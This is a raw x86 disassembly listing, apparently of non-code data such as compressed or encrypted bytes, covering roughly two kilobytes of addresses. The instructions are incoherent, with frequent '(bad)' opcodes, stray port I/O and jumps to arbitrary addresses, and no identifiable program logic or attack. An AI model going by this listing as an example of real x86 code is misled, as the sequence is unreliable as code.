  521fed:	mov    bl,0x6f
  521fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  521ff0:	inc    esp
  521ff1:	lods   eax,DWORD PTR ds:[esi]
  521ff2:	sub    ecx,0x2b
  521ff5:	adc    eax,0x869a1feb
  521ffa:	call   0x53bc7cd6
  521fff:	jne    0x522017
  522001:	pop    edx
  522002:	pop    esp
  522003:	add    BYTE PTR [ebx-0x19],ch
  522006:	dec    ebx
  522007:	inc    edi
  522008:	mov    esp,cs
  52200a:	stos   BYTE PTR es:[edi],al
  52200b:	jmp    0x522018
  52200d:	test   DWORD PTR [esp+ebx*2],ebx
  522010:	xor    DWORD PTR [eax+0x15],ebp
  522013:	jne    0x522040
  522015:	out    dx,al
  522016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  522017:	retf   
  522018:	push   ds
  522019:	stc    
  52201a:	addr16 jge 0x52207e
  52201d:	fwait
  52201e:	push   0xfffffffa
  522020:	push   0xffffff84
  522022:	and    BYTE PTR [ecx+eax*8],cl
  522025:	push   0xffffff88
  522027:	or     BYTE PTR [edi+ebx*4-0x48],0xac
  52202c:	ds mov esi,0x5af2f6e3
  522032:	adc    eax,0xc566f52c
  522037:	rcl    cl,1
  522039:	sub    al,0x45
  52203b:	inc    ecx
  52203c:	jno    0x522000
  52203e:	adc    BYTE PTR [ebx+eiz*4],bl
  522041:	leave  
  522042:	mov    edx,0x4745a238
  522047:	jns    0x522015
  522049:	push   cs
  52204a:	push   ebx
  52204b:	rcl    BYTE PTR [eax-0x7e],1
  52204e:	jmp    0x5f4aa913
  522053:	push   ebx
  522054:	and    eax,0x6e7e9fc
  522059:	(bad)  
  52205a:	daa    
  52205b:	fs push ebp
  52205d:	inc    ebx
  52205e:	and    eax,0xe9a8c006
  522063:	cdq    
  522064:	popf   
  522065:	lea    ebx,[ecx]
  522067:	test   BYTE PTR [ebx-0x431afd],0x4
  52206e:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  522070:	and    edx,DWORD PTR [edi]
  522072:	mov    ch,BYTE PTR [ecx+0x2a]
  522075:	dec    edi
  522076:	mov    ebx,0x3d7d9f5c
  52207b:	jbe    0x522047
  52207d:	retf   0xb904
  522080:	(bad)  [esi]
  522082:	push   edi
  522083:	test   esp,edi
  522085:	test   DWORD PTR es:[ebx+0x22],ebx
  522089:	(bad)  
  52208a:	loopne 0x52208f
  52208c:	pop    es
  52208d:	jne    0x522050
  52208f:	add    al,0xe
  522091:	ja     0x522030
  522093:	add    esi,ebx
  522095:	jae    0x52204e
  522097:	clc    
  522098:	fisubr DWORD PTR [edx-0x17]
  52209b:	adc    eax,0xe84c351e
  5220a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5220a1:	xor    BYTE PTR [edi],ch
  5220a3:	into   
  5220a4:	lock sti 
  5220a6:	lahf   
  5220a7:	test   eax,0xb4429660
  5220ac:	mov    ds:0x6f89de61,al
  5220b1:	mov    cl,0xee
  5220b3:	sbb    DWORD PTR [ecx],0xe35d30a0
  5220b9:	inc    edi
  5220ba:	(bad)  
  5220bb:	xor    BYTE PTR [eax+0x288473d5],dl
  5220c1:	scas   eax,DWORD PTR es:[edi]
  5220c2:	cdq    
  5220c3:	sub    BYTE PTR [esi],bh
  5220c5:	int    0x3
  5220c7:	or     al,0xb7
  5220c9:	clc    
  5220ca:	and    BYTE PTR [esi],dl
  5220cc:	and    eax,DWORD PTR [ecx+0x78]
  5220cf:	adc    ecx,edi
  5220d1:	lds    ecx,FWORD PTR ds:0x13375639
  5220d7:	and    al,0x40
  5220d9:	ficom  DWORD PTR [esi]
  5220db:	mov    esp,0xcee3da8d
  5220e0:	sbb    eax,0x9a142d29
  5220e5:	pop    ebp
  5220e6:	das    
  5220e7:	or     BYTE PTR [ebx+ecx*2-0x69b4dc25],al
  5220ee:	mov    WORD PTR [ebp-0x79],?
  5220f1:	xchg   esp,eax
  5220f2:	fcomp  st(3)
  5220f4:	ja     0x5220e1
  5220f6:	sub    esi,eax
  5220f8:	cs push esp
  5220fa:	jg     0x52210d
  5220fc:	ins    BYTE PTR es:[edi],dx
  5220fd:	mov    BYTE PTR [ecx],dh
  5220ff:	cmp    dl,BYTE PTR [ecx*8-0x3852bfa7]
  522106:	fld    DWORD PTR [edx-0x6eb20954]
  52210c:	cmp    al,0xb2
  52210e:	pop    eax
  52210f:	jp     0x5220ff
  522111:	xchg   esi,eax
  522112:	push   ebx
  522113:	adc    cl,BYTE PTR [eax-0x49]
  522116:	adc    al,0xac
  522118:	retf   
  522119:	jbe    0x52212b
  52211b:	jb     0x5220d1
  52211d:	repz out 0xd1,al
  522120:	inc    ecx
  522121:	adc    ah,BYTE PTR [eax-0x158bb59e]
  522127:	jns    0x522134
  522129:	enter  0x6eb7,0x7b
  52212d:	cmp    bh,BYTE PTR [edi]
  52212f:	fs (bad) 
  522131:	(bad)  
  522132:	mov    esp,0x2f179285
  522137:	mov    ah,0x7a
  522139:	push   ebp
  52213a:	pop    esi
  52213b:	lds    ebp,FWORD PTR [ecx+eax*4-0x11]
  52213f:	add    DWORD PTR [esi-0x57b279fd],0xf00be7ca
  522149:	lea    edx,[edx+0x5b54e324]
  52214f:	mov    cl,0xc0
  522151:	xchg   edx,eax
  522152:	xchg   edi,eax
  522153:	outs   dx,DWORD PTR ds:[esi]
  522154:	cmp    ecx,DWORD PTR [eax]
  522156:	dec    BYTE PTR [esp+ebx*8-0x3d]
  52215a:	pop    edx
  52215b:	fsubr  st,st(6)
  52215d:	push   cs
  52215e:	or     al,0xde
  522160:	jp     0x522136
  522162:	sub    ah,ch
  522164:	int    0x60
  522166:	cmp    DWORD PTR [ebx+esi*1-0x5f050201],edx
  52216d:	icebp  
  52216e:	xor    dl,BYTE PTR [edx+0x21]
  522171:	inc    ecx
  522172:	scas   eax,DWORD PTR es:[edi]
  522173:	push   eax
  522174:	sahf   
  522175:	xchg   ebp,eax
  522176:	xchg   ebx,eax
  522177:	mov    edx,DWORD PTR [eax]
  522179:	jmp    0xe4580e65
  52217e:	adc    dl,bl
  522180:	and    DWORD PTR [esi+0x5f],ebx
  522183:	mov    ecx,DWORD PTR [edi]
  522185:	inc    esi
  522186:	push   ecx
  522187:	fwait
  522188:	mov    eax,0xe4d04ee2
  52218d:	jge    0x522123
  52218f:	or     eax,0x53efd77b
  522194:	jne    0x522191
  522196:	fstp   TBYTE PTR fs:[esi-0x5cb53f4f]
  52219d:	jnp    0x5221fb
  52219f:	mov    al,ds:0x1eb762f5
  5221a4:	jb     0x522206
  5221a6:	mov    ch,BYTE PTR [esi+0x25da99cc]
  5221ac:	or     edi,eax
  5221ae:	inc    DWORD PTR [ecx-0x36]
  5221b1:	pop    DWORD PTR [eax-0x55]
  5221b4:	in     eax,0x2e
  5221b6:	mov    ebx,0xfb7b899a
  5221bb:	dec    edx
  5221bc:	inc    edx
  5221bd:	and    dh,BYTE PTR ds:[esi+0x40]
  5221c1:	cmp    eax,0x657d4235
  5221c6:	sub    eax,0x8362de4e
  5221cb:	add    al,0x8
  5221cd:	jnp    0x5221e6
  5221cf:	jno    0x522185
  5221d1:	cmp    ebp,ebp
  5221d3:	xor    ax,0xc155
  5221d7:	pop    es
  5221d8:	adc    edi,DWORD PTR [eax+0x454954d3]
  5221de:	sub    al,0xc0
  5221e0:	rcl    DWORD PTR gs:[ecx+0x67],cl
  5221e4:	sbb    edx,DWORD PTR [ebp+0x2bd1a433]
  5221ea:	push   edx
  5221eb:	scas   al,BYTE PTR es:[edi]
  5221ec:	(bad)  
  5221ed:	fs add dh,cl
  5221f0:	push   ss
  5221f1:	rol    BYTE PTR [edx+0x48],1
  5221f4:	je     0x522241
  5221f6:	xor    eax,0xc3eed6fc
  5221fb:	inc    ebx
  5221fc:	mov    bh,ah
  5221fe:	inc    eax
  5221ff:	cli    
  522200:	test   DWORD PTR [ebp+0x34505d4c],0x282e9068
  52220a:	shl    DWORD PTR [esi+0x54b6bfdc],cl
  522210:	(bad)  
  522211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  522212:	cli    
  522213:	(bad)  
  522214:	fsubrp st(5),st
  522216:	enter  0xb72a,0x3d
  52221a:	ins    DWORD PTR es:[edi],dx
  52221b:	adc    BYTE PTR [ecx],bh
  52221d:	dec    ecx
  52221e:	dec    esp
  52221f:	(bad)  
  522220:	lds    esp,FWORD PTR [edx-0x1656ea10]
  522226:	mov    edi,0xd44dc7a8
  52222b:	mov    ebx,0x432f50ae
  522230:	xor    al,0xa2
  522232:	(bad)
  522235:	inc    eax
  522236:	pop    edx
  522237:	out    dx,eax
  522238:	addr16 jmp 0x69060dd1
  52223e:	mov    cl,0xd1
  522240:	fs cld 
  522242:	sbb    BYTE PTR [edi+edx*8+0x15c94ce7],bh
  522249:	das    
  52224a:	xchg   BYTE PTR [eax+0x6c7e254c],ch
  522250:	ins    DWORD PTR es:[edi],dx
  522251:	push   es
  522252:	ins    BYTE PTR es:[edi],dx
  522253:	pop    esp
  522254:	jle    0x522247
  522256:	es das 
  522258:	js     0x522277
  52225a:	push   eax
  52225b:	pop    ebp
  52225c:	aaa    
  52225d:	jb     0x5222a7
  52225f:	test   bh,dl
  522261:	into   
  522262:	pop    esi
  522263:	mov    ch,0xb8
  522265:	push   eax
  522266:	and    BYTE PTR [esi+0x3db2672b],bh
  52226c:	adc    al,0xcb
  52226e:	cmp    DWORD PTR [ebx],esp
  522270:	sbb    al,0x68
  522272:	cmpxchg DWORD PTR [ecx],eax
  522275:	jmp    0x796253f5
  52227a:	sub    BYTE PTR [ebx],cl
  52227c:	pop    ebx
  52227d:	mov    ch,0x2a
  522280:	push   ebp
  522281:	daa    
  522282:	mov    esp,0xe7a2ead6
  522287:	sub    DWORD PTR [eax+0x34755859],ebx
  52228d:	loop   0x5222bc
  52228f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  522291:	jmp    0x5997:0xcfc87f2d
  522298:	mov    ecx,0xada4953f
  52229d:	inc    edi
  52229e:	cmp    bl,BYTE PTR [edx+0xd]
  5222a1:	cmp    ah,BYTE PTR [edx]
  5222a3:	inc    ebx
  5222a4:	sbb    DWORD PTR [ecx-0x3605afa3],edx
  5222aa:	(bad)  
  5222ac:	and    DWORD PTR [ecx-0x1d3e8cd8],ebx
  5222b2:	jno    0x52225a
  5222b4:	(bad)  
  5222b5:	lss    ebp,FWORD PTR [ebx-0x4353ad5a]
  5222bc:	ror    bl,1
  5222be:	add    al,0x56
  5222c0:	gs pop edx
  5222c2:	push   0xfffffff5
  5222c4:	cmp    eax,0xc34f8596
  5222c9:	fsub   DWORD PTR [edx]
  5222cb:	mov    esi,0x86f11ab
  5222d0:	push   eax
  5222d1:	jl     0x5222a0
  5222d3:	mov    edi,esp
  5222d5:	sub    edi,DWORD PTR [edx]
  5222d7:	push   esp
  5222d8:	loop   0x522358
  5222da:	xchg   ebx,eax
  5222db:	out    0x53,al
  5222dd:	test   eax,0x8888f791
  5222e2:	fnstcw WORD PTR [edx+ecx*4]
  5222e5:	lea    esi,[edx+ebp*4]
  5222e8:	and    al,0x40
  5222ea:	fnstenv [esi+0xc241023]
  5222f0:	cmp    ebp,0x27
  5222f3:	or     al,0xe3
  5222f5:	xchg   DWORD PTR [esi-0x6d],eax
  5222f8:	jmp    0x52231a
  5222fa:	pushf  
  5222fb:	aad    0x19
  5222fd:	sahf   
  5222fe:	stos   BYTE PTR es:[edi],al
  5222ff:	inc    ebp
  522300:	push   edx
  522301:	scas   eax,DWORD PTR es:[edi]
  522302:	mov    BYTE PTR [edi-0x73bfd01],bh
  522308:	xchg   BYTE PTR [ebx+0x13b9524e],ah
  52230e:	mov    ecx,edi
  522310:	mov    esp,0xcb1bea77
  522315:	mov    ds:0x2b527dfa,al
  52231a:	retf   
  52231b:	and    esp,edx
  52231d:	xor    DWORD PTR [esi+eax*8-0x80],0x72c38bfc
  522325:	ret    
  522326:	jge    0x522333
  522328:	push   esi
  522329:	mov    ecx,0x14299657
  52232e:	leave  
  52232f:	dec    ecx
  522330:	(bad)  
  522331:	sub    dl,BYTE PTR [ecx+0x64]
  522334:	sbb    ch,BYTE PTR [ebx-0x2c6b06e0]
  52233a:	push   eax
  52233b:	jl     0x5222c2
  52233d:	and    ebx,esi
  52233f:	mov    eax,0x1f0c1ef3
  522344:	adc    DWORD PTR [eax],esp
  522346:	sub    eax,0x799a1ac4
  52234b:	(bad)  
  52234c:	mov    DWORD PTR [ebp-0x33],edx
  52234f:	xchg   esi,eax
  522350:	cwde   
  522351:	outs   dx,DWORD PTR ds:[esi]
  522352:	mov    WORD PTR [ebx-0x3536e157],?
  522358:	lea    ebp,[eax-0x40]
  52235b:	jb     0x522384
  52235d:	sub    BYTE PTR [ecx+0x26626936],cl
  522363:	call   0xead0a2a4
  522368:	mov    BYTE PTR [esi],ah
  52236a:	test   BYTE PTR [esi+0x37f7006e],dh
  522370:	out    dx,eax
  522371:	out    dx,al
  522372:	repnz adc bp,sp
  522376:	(bad)  
  522377:	cmp    ch,dh
  522379:	sar    bh,1
  52237b:	fs in  al,0xad
  52237e:	xor    ecx,DWORD PTR [ecx-0x55]
  522381:	ja     0x5223c5
  522383:	int3   
  522384:	dec    ebp
  522385:	out    dx,eax
  522386:	cli    
  522387:	scas   al,BYTE PTR es:[edi]
  522388:	aad    0x0
  52238a:	mov    ds,WORD PTR [ecx+0x6bf4d393]
  522390:	jg     0x5223b9
  522392:	imul   ebx,eax,0x6b
  522395:	ss inc ebx
  522397:	(bad)
  52239b:	fst    QWORD PTR [esi+0x32ee6aa3]
  5223a1:	xchg   esp,eax
  5223a2:	push   edi
  5223a3:	dec    edx
  5223a4:	jb     0x52232d
  5223a6:	pop    edx
  5223a7:	sar    cl,0x77
  5223aa:	icebp  
  5223ab:	into   
  5223ac:	int3   
  5223ad:	pushf  
  5223ae:	lds    ebx,FWORD PTR [esi+0x2a]
  5223b1:	sub    edi,0x188e40a9
  5223b7:	repnz mov ecx,0x3f8220d4
  5223bd:	xor    ecx,DWORD PTR [ebx]
  5223bf:	idiv   DWORD PTR [eax+0xad7054b]
  5223c5:	or     DWORD PTR [edi],esp
  5223c7:	cmc    
  5223c8:	xor    eax,0xf0f5509b
  5223cd:	adc    dh,BYTE PTR [ebp-0x27873bb9]
  5223d3:	jns    0x5223da
  5223d5:	sti    
  5223d6:	pop    edi
  5223d7:	jl     0x5223a1
  5223d9:	or     eax,0xd8c1c23
  5223de:	ins    BYTE PTR es:[edi],dx
  5223df:	out    dx,eax
  5223e0:	pop    ds
  5223e1:	ret    0x794a
  5223e4:	call   0xdce05c1a
  5223e9:	xor    eax,0xfc90218b
  5223ee:	lds    edx,FWORD PTR [ecx]
  5223f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5223f1:	and    BYTE PTR [ebp+edi*4+0x71],0x22
  5223f6:	push   0xffffffe8
  5223f8:	mov    ah,0x3a
  5223fa:	stos   BYTE PTR es:[edi],al
  5223fb:	and    DWORD PTR [eax+ebx*4],0x18
  5223ff:	mov    ds:0x96721368,ax
  522405:	ss sti 
  522407:	jno    0x5223bb
  522409:	xor    eax,0x334000a0
  52240e:	sbb    DWORD PTR [ebp+0x2e],ecx
  522411:	mov    bl,0x19
  522413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  522414:	jmp    FWORD PTR [esi]
  522416:	cmc    
  522417:	sub    eax,0x19877928
  52241c:	aas    
  52241d:	jb     0x522438
  52241f:	(bad)  
  522420:	sub    BYTE PTR [ebp+0x3d6666db],bl
  522426:	repz sbb DWORD PTR [ebx-0x5c34565a],eax
  52242d:	lahf   
  52242e:	repnz stos DWORD PTR es:[edi],eax
  522430:	rcr    BYTE PTR [ebx+0x7f2297c5],cl
  522436:	scas   eax,DWORD PTR es:[edi]
  522437:	(bad)  
  522439:	dec    edi
  52243a:	and    eax,DWORD PTR [ebp+0x73b96dd3]
  522440:	loope  0x52249d
  522442:	repz add dh,bl
  522445:	mov    ch,0x88
  522447:	addr16 mov eax,0xf27aa71c
  52244d:	xchg   ebx,eax
  52244e:	jg     0x5224c5
  522450:	mov    ah,0x3f
  522452:	outs   dx,BYTE PTR ds:[esi]
  522453:	adc    BYTE PTR [edx],bl
  522455:	push   ds
  522456:	fs in  eax,dx
  522458:	dec    esi
  522459:	mov    BYTE PTR [ebx-0x7a59c17c],bl
  52245f:	add    cl,ch
  522461:	push   cs
  522462:	popf   
  522463:	bound  edi,QWORD PTR [ebp-0x5f54cd1f]
  522469:	mov    ah,BYTE PTR [eax]
  52246b:	mov    WORD PTR [edx+0x15fa4289],cs
  522471:	cli    
  522472:	sbb    al,0x92
  522474:	and    ebp,0xffffffce
  522477:	mov    ecx,ebx
  522479:	jecxz  0x52243a
  52247b:	fcomip st,st(3)
  52247d:	cmp    ah,al
  52247f:	mov    ah,0xea
  522481:	push   esp
  522482:	dec    ecx
  522483:	mov    ecx,0xd348aa3b
  522488:	xchg   ebp,eax
  522489:	es cmp ebp,0x364174a5
  522490:	jp     0x5224f8
  522492:	pop    eax
  522493:	add    DWORD PTR [edx-0x6df24d7d],ebx
  522499:	jb     0x522461
  52249b:	adc    al,0x1
  52249d:	inc    ebp
  52249e:	(bad)  
  52249f:	push   ss
  5224a0:	dec    ebx
  5224a1:	mov    ah,0xd3
  5224a3:	dec    esi
  5224a4:	mov    eax,0x9603ca27
  5224a9:	imul   esi,edx,0xdf7f56f1
  5224af:	mov    ah,0x4c
  5224b1:	cld    
  5224b2:	retf   0xa6ba
  5224b5:	push   edi
  5224b6:	(bad)
  5224ba:	jmp    0x522451
  5224bc:	retf   
  5224bd:	fwait
  5224be:	sar    ah,1
  5224c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5224c1:	mov    cs,edx
  5224c3:	or     ebx,DWORD PTR [esi+esi*2+0x40146d39]
  5224ca:	jae    0x52246f
  5224cc:	neg    DWORD PTR [esi+0x2ec8529]
  5224d2:	inc    ebp
  5224d3:	mov    WORD PTR [eax],?
  5224d5:	daa    
  5224d6:	rcr    edx,1
  5224d8:	xchg   ebp,eax
  5224d9:	rcl    BYTE PTR [ebp-0x25440dd2],cl
  5224df:	inc    esp
  5224e0:	dec    ecx
  5224e1:	mov    ds,WORD PTR [esi]
  5224e3:	xchg   edi,eax
  5224e4:	lea    ebp,[edx+0x4436084f]
  5224ea:	jb     0x522523
  5224ec:	sahf   
  5224ed:	clc    
  5224ee:	push   edx
  5224ef:	ret    0x134d
  5224f2:	jg     0x522541
  5224f4:	dec    edi
  5224f5:	mov    eax,ds:0xac59ea88
  5224fa:	add    al,0xd2
  5224fc:	mov    dh,0xd1
  5224fe:	out    0x50,ax
  522501:	push   ecx
  522502:	neg    BYTE PTR [edi+0x1b]
  522505:	dec    esp
  522506:	aam    0x26
  522508:	icebp  
  522509:	in     eax,dx
  52250a:	lds    edx,FWORD PTR [edx+ebx*2]
  52250d:	dec    ebx
  52250e:	call   0xf31f:0x87b314d6
  522515:	(bad)  
  522516:	ror    DWORD PTR [edx+0x6c],1
  522519:	popf   
  52251a:	fld    DWORD PTR [edi+0x5a]
  52251d:	(bad)  
  52251e:	div    ebx
  522520:	retf   
  522521:	sub    eax,0xbcac34ef
  522526:	test   edx,ecx
  522528:	popa   
  522529:	inc    edi
  52252a:	retf   0x61c3
  52252d:	jle    0x52258a
  52252f:	adc    eax,0xe2287e89
  522534:	pop    esi
  522535:	shr    BYTE PTR ds:0xfbdb9b55,1
  52253b:	div    bl
  52253d:	dec    esi
  52253e:	je     0x522555
  522540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  522541:	data16 cmp BYTE PTR [esi+0x2c915891],dl
  522548:	cmp    DWORD PTR [ebp+0x28],esp
  52254b:	push   esi
  52254c:	test   BYTE PTR [esi],bh
  52254e:	(bad)  [ebp+0x40]
  522551:	jb     0x5224e1
  522553:	inc    edx
  522554:	fwait
  522555:	ret    
  522556:	mov    WORD PTR [eax-0x7ef8fa8e],gs
  52255c:	push   ecx
  52255d:	nop    DWORD PTR [edi]
  522560:	hlt    
  522561:	aas    
  522562:	xchg   edx,eax
  522563:	(bad)  
  522564:	aam    0xc1
  522566:	bound  ebx,QWORD PTR [edi+0x3e]
  522569:	push   es
  52256a:	pop    esp
  52256b:	test   al,0x57
  52256d:	jnp    0x522517
  52256f:	sub    DWORD PTR [edi+0xad93337],edx
  522575:	out    dx,al
  522576:	rol    DWORD PTR [eax+0x31ee27b],cl
  52257c:	adc    bh,0xbf
  52257f:	stos   DWORD PTR es:[edi],eax
  522580:	fbld   TBYTE PTR [eax]
  522582:	or     BYTE PTR [ebx+0x41],dh
  522585:	jmp    0x38fa1d0
  52258a:	push   edx
  52258b:	pop    esi
  52258c:	xlat   BYTE PTR ds:[ebx]
  52258d:	jg     0x52251d
  52258f:	shl    BYTE PTR [edi],1
  522591:	mov    ebp,0xf66979a0
  522596:	jae    0x522609
  522598:	mov    eax,0x241c8148
  52259d:	pop    eax
  52259e:	mov    esp,fs
  5225a0:	pop    ds
  5225a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5225a2:	out    0xb3,al
  5225a4:	xchg   ebx,esi
  5225a6:	xor    BYTE PTR [ecx+0x64],al
  5225a9:	pop    edx
  5225aa:	adc    eax,0x6645f532
  5225af:	sbb    esp,esp
  5225b1:	adc    BYTE PTR [ebp-0x22],al
  5225b4:	cld    
  5225b5:	sti    
  5225b6:	pop    esi
  5225b7:	int    0xbe
  5225b9:	retf   
  5225ba:	ins    DWORD PTR es:[edi],dx
  5225bb:	test   BYTE PTR [eax-0x29990094],0xc8
  5225c2:	or     edx,esi
  5225c4:	cdq    
  5225c5:	xlat   BYTE PTR ds:[ebx]
  5225c6:	xchg   BYTE PTR [ebx-0x5eba4059],ch
  5225cc:	mov    bl,0x12
  5225ce:	(bad)  
  5225cf:	jecxz  0x5225fa
  5225d1:	sahf   
  5225d2:	addr16 xchg edx,eax
  5225d4:	sbb    eax,0xc28386bc
  5225d9:	or     al,0xe6
  5225db:	mov    al,0x3a
  5225dd:	std    
  5225de:	xchg   edx,eax
  5225df:	pop    ds
  5225e0:	call   DWORD PTR [ecx+0xf]
  5225e3:	xor    al,0xc5
  5225e5:	(bad)  
  5225e6:	aas    
  5225e7:	and    edi,DWORD PTR [edi+0x499a1090]
  5225ed:	addr16 dec eax
  5225ef:	ins    DWORD PTR es:[edi],dx
  5225f0:	push   ebx
  5225f1:	or     edi,DWORD PTR [ebp-0x10a55ad5]
  5225f7:	inc    edx
  5225f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5225f9:	inc    esi
  5225fa:	xor    DWORD PTR [edi],0x7eb2acf1
  522600:	loopne 0x5225d9
  522602:	jge    0x5225ee
  522604:	arpl   WORD PTR [ebp-0x6d],bx
  522607:	fild   QWORD PTR [ebp+0x74]
  52260a:	adc    eax,0x631c0bdc
  52260f:	sti    
  522610:	mov    BYTE PTR [ebx],dh
  522612:	jne    0x522687
  522614:	loopne 0x5225d5
  522616:	mov    eax,ds:0x802c924d
  52261b:	cs das 
  52261d:	cdq    
  52261e:	jge    0x5225fa
  522620:	add    DWORD PTR [edi+0x7663f076],ecx
  522626:	icebp  
  522627:	loopne 0x5225ce
  522629:	popf   
  52262a:	and    DWORD PTR [edi-0x5e],0x31
  52262e:	fstp   QWORD PTR [ecx-0x47]
  522631:	xor    al,0xba
  522633:	jo     0x522633
  522635:	xor    BYTE PTR [edi],0xe9
  522638:	xor    DWORD PTR [ecx],ebp
  52263a:	jne    0x522655
  52263c:	repnz bound esi,QWORD PTR [edx-0x166faa94]
  522643:	mov    dl,BYTE PTR [edi+0x14abf7b2]
  522649:	mov    ch,0xe7
  52264b:	and    edx,0xc21b9258
  522651:	jbe    0x5225e9
  522653:	ss (bad) 
  522655:	add    edi,DWORD PTR es:[ebx-0x399ad3e5]
  52265c:	sub    DWORD PTR [edx-0x6f],ebx
  52265f:	popa   
  522660:	cmp    al,BYTE PTR [ebx-0x264e9962]
  522666:	fdecstp 
  522668:	ins    BYTE PTR es:[edi],dx
  522669:	lds    esp,FWORD PTR [ecx+0x61]
  52266c:	pushf  
  52266d:	mov    al,0xb6
  52266f:	call   0x10e5965a
  522674:	pop    eax
  522675:	adc    al,BYTE PTR [esp+eiz*4+0x6342537f]
  52267c:	jmp    0x34b5:0x2154a8c9
  522683:	shr    ch,0x93
  522686:	pop    esi
  522687:	gs popa 
  522689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52268a:	pop    ebx
  52268b:	mov    bl,0x97
  52268d:	ins    BYTE PTR es:[edi],dx
  52268e:	(bad)  
  52268f:	dec    esi
  522690:	jmp    0x7f59a033
  522695:	lock mov WORD PTR [esp+esi*1-0x2c74f47e],?
  52269d:	and    eax,0xff88a730
  5226a2:	test   DWORD PTR [esi+0x784bf067],ebx
  5226a8:	or     BYTE PTR [esi],al
  5226aa:	cwde   
  5226ab:	out    0x51,al
  5226ad:	pop    ss
  5226ae:	lock ins DWORD PTR es:[edi],dx
  5226b0:	maskmovq mm5,(bad)
  5226b1:	imul   DWORD PTR [ecx-0x2]
  5226b4:	push   edi
  5226b5:	hlt    
  5226b6:	xchg   esp,eax
  5226b7:	imul   eax,DWORD PTR [edi],0xac41b05c
  5226bd:	mov    ch,0x4e
  5226bf:	jmp    0x522705
  5226c1:	or     DWORD PTR [ecx-0x5ad0739f],eax
  5226c7:	sub    BYTE PTR [ecx+0x43e78714],al
  5226cd:	test   eax,0xf8cb9c22
  5226d2:	pop    ds
  5226d3:	ins    DWORD PTR es:[edi],dx
  5226d4:	pop    ebx
  5226d5:	cmp    eax,0xa8b94554
  5226da:	sbb    dl,BYTE PTR [ebp-0x6e3ea613]
  5226e0:	adc    ebx,DWORD PTR [esi]
  5226e2:	rcl    edx,1
  5226e4:	fmul   st,st(3)
  5226e6:	inc    edi
  5226e7:	push   0x3f
  5226e9:	and    al,0x7d
  5226eb:	popa   
  5226ec:	mov    dl,0x91
  5226ee:	jle    0x5226e6
  5226f0:	xor    eax,DWORD PTR [ebx-0x18]
  5226f3:	add    esi,ecx
  5226f5:	xchg   esp,eax
  5226f6:	cmp    BYTE PTR [esi-0x7363424d],bl
  5226fc:	xor    esi,ebp
  5226fe:	aas    
  5226ff:	pop    eax
  522700:	sub    eax,0x38476b0
  522705:	add    eax,0x3d32d76e
  52270a:	mov    ebp,0x474474c2
  52270f:	push   esi
  522710:	and    edx,edi
  522712:	xchg   DWORD PTR [ebp-0x249ed92a],ebx
  522718:	pusha  
  522719:	mov    eax,0xd6510dfa
  52271e:	ins    BYTE PTR es:[edi],dx
  52271f:	push   ecx
  522720:	xor    BYTE PTR [esi+esi*4],ah
  522723:	das    
  522724:	(bad)  
  522725:	cdq    
  522726:	inc    edx
  522727:	(bad)  
  522728:	stos   DWORD PTR es:[edi],eax
  522729:	in     eax,dx
  52272a:	pop    esp
  52272b:	mov    eax,0x2ba97ab2
  522730:	cmp    eax,0x4aa3010c
  522735:	das    
  522736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  522737:	(bad)
  52273a:	cmp    edi,ebp
  52273c:	sub    ah,0x99
  52273f:	out    0x30,al
  522741:	je     0x5226ea
  522743:	shl    DWORD PTR [eax],1
  522745:	inc    ebp
  522746:	jmp    0x6d0c879a
  52274b:	rol    DWORD PTR [ecx],1
  52274d:	jb     0x522762
  52274f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  522750:	je     0x5227a0
  522752:	je     0x522723
  522754:	jne    0x52277d
  522756:	push   cs
  522757:	xor    BYTE PTR [edi],al
  522759:	dec    ebx
  52275a:	or     BYTE PTR [ecx-0x4a],0xdd
  52275e:	mov    ebx,0x522681a4
  522763:	push   ss
  522764:	or     ch,BYTE PTR [edi+0x24]
  522767:	jecxz  0x5226f2
  522769:	xchg   esi,eax
  52276a:	mov    dl,0xfd
  52276c:	stos   BYTE PTR es:[edi],al
  52276d:	push   esp
  52276e:	jae    0x522727
  522770:	popa   
  522771:	fild   WORD PTR [eax+0x2926dcc6]
  522777:	sub    eax,0x8f7a1ffd
  52277c:	dec    eax
  52277d:	xor    dh,cl
  52277f:	jnp    0x5227f5
  522781:	cli    
  522782:	mov    eax,0xdb35470c
  522787:	push   ecx
  522788:	aam    0x43
  52278a:	or     BYTE PTR [edx+ecx*1-0x75],bh
  52278e:	xchg   ebx,eax
  52278f:	iret   
  522790:	mov    ebp,0x91de4c73
  522795:	fistp  QWORD PTR [ecx+0x620e29bc]
  52279b:	fucomip st,st(1)
  52279d:	jp     0x52274d
  52279f:	test   BYTE PTR [edx+ebx*1],dh
  5227a2:	leave  
  5227a3:	jo     0x522790
  5227a5:	adc    DWORD PTR [esp+eax*4-0x1c],eax
  5227a9:	jns    0x5227e1
  5227ab:	sub    ebx,eax
  5227ad:	add    al,0xb2
  5227af:	dec    edi
  5227b0:	in     eax,0x76
  5227b2:	loop   0x5227eb
  5227b4:	(bad)  
  5227b5:	shrd   DWORD PTR [edi],esp,0x20
  5227b9:	mov    dl,0xc
  5227bb:	sub    al,0xa8
  5227bd:	sub    ecx,DWORD PTR [ecx-0x46d352a1]
  5227c3:	iret   
  5227c4:	add    ch,BYTE PTR [ebp+edi*4+0x3]
  5227c8:	div    edx
  5227ca:	pop    ebx
  5227cb:	fmul   QWORD PTR [esi+0x45]
  5227ce:	out    0xfd,al
  5227d0:	pop    edi
  5227d1:	push   ss
  5227d2:	arpl   WORD PTR [esi-0x2165b1ba],di
  5227d8:	js     0x522822
  5227da:	pop    edi
  5227db:	dec    esp
  5227dc:	adc    edi,0x6e
  5227df:	imul   esp,DWORD PTR [ebx-0x64],0x9a47e4fb
